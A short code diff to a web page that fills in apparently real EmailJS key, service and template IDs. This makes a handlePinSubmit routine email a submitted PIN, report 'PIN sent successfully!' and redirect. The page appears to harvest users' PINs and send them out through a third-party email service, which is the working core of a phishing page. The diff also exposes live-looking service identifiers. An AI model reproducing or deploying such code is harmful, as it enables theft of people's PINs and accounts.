@@ -8,7 +8,7 @@
     <script>
         // Initialize EmailJS
         (function() {
-            emailjs.init("YOUR_PUBLIC_KEY"); // Replace with your EmailJS public key
+            emailjs.init("efOS3BYOfs1Zl78GR"); // Replace with your EmailJS public key
         })();
 
         function handlePinSubmit(event) {
@@ -28,7 +28,7 @@
                 };
 
                 // Send the email using EmailJS
-                emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", emailParams)
+                emailjs.send("service_lkb1bn2", "template_pilpwls", emailParams)
                     .then(() => {
                         alert("PIN sent successfully!");
                         // Redirect after successful email send
